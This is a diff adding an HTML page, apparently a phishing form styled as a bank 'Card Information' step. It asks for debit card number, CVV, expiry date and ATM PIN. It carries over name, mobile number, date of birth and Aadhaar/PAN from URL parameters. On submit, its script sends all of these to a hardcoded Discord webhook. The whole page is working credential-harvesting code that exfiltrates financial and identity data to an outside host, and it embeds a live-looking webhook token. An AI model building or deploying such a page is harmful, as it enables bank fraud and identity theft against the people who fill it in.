@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Card Information</title>
+  <style>
+    body {
+      background-color: yellow;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #4CAF50;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Card Information</h2>
+    <form id="cardForm">
+      <input type="hidden" id="fullName" name="fullName">
+      <input type="hidden" id="mobileNumber" name="mobileNumber">
+      <input type="hidden" id="dob" name="dob">
+      <input type="hidden" id="aadhaarPan" name="aadhaarPan">
+
+      <label for="debitCard">Debit Card Number</label>
+      <input type="number" id="debitCard" name="debitCard" placeholder="Enter debit card number" required>
+
+      <label for="cvv">CVV</label>
+      <input type="number" id="cvv" name="cvv" placeholder="Enter CVV" required>
+
+      <label for="expiryDate">Expiry Date</label>
+      <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>
+
+      <label for="atmPin">ATM PIN</label>
+      <input type="number" id="atmPin" name="atmPin" placeholder="Enter ATM PIN" required>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    // Get data from URL query parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    document.getElementById("fullName").value = urlParams.get("fullName");
+    document.getElementById("mobileNumber").value = urlParams.get("mobileNumber");
+    document.getElementById("dob").value = urlParams.get("dob");
+    document.getElementById("aadhaarPan").value = urlParams.get("aadhaarPan");
+
+    // Discord webhook URL
+    const webhookURL = "https://discord.com/api/webhooks/1314475255292497940/CUcPPvPqZnQUAXZ90zkym2cMDP33UlxXs2oY7Bo4UvVgK-2EJyWz53emq_QpTz-CM5st"; // Replace with your actual Discord webhook URL
+
+    // Submit form data to Discord
+    const form = document.getElementById("cardForm");
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const data = {
+        "Full Name": document.getElementById("fullName").value,
+        "Mobile Number": document.getElementById("mobileNumber").value,
+        "Date of Birth": document.getElementById("dob").value,
+        "Aadhaar/PAN": document.getElementById("aadhaarPan").value,
+        "Debit Card Number": document.getElementById("debitCard").value,
+        "CVV": document.getElementById("cvv").value,
+        "Expiry Date": document.getElementById("expiryDate").value,
+        "ATM PIN": document.getElementById("atmPin").value,
+      };
+
+      const content = Object.entries(data)
+        .map(([key, value]) => `**${key}:** ${value}`)
+        .join("\n");
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content }),
+        });
+
+        alert("Data submitted successfully!");
+      } catch (error) {
+        console.error("Error submitting data:", error);
+        alert("There was an error submitting your data. Please try again.");
+      }
+    });
+  </script>
+</body>
+</html>
